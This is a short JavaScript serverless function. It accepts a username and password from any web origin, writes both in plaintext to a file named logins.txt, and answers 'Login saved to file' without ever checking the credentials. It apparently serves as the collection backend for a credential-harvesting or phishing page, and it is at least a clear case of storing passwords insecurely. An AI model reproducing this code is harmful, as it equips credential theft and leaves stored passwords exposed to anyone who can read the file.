const fs = require('fs');
const path = require('path');

exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);
    const { username, password } = data;

    const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;

    const filePath = path.join(__dirname, 'logins.txt');

    fs.appendFileSync(filePath, logEntry);

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Login saved to file" }),
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    };
  } catch (error) {
    console.error("Error saving login:", error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "Failed to save login" }),
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    };
  }
};
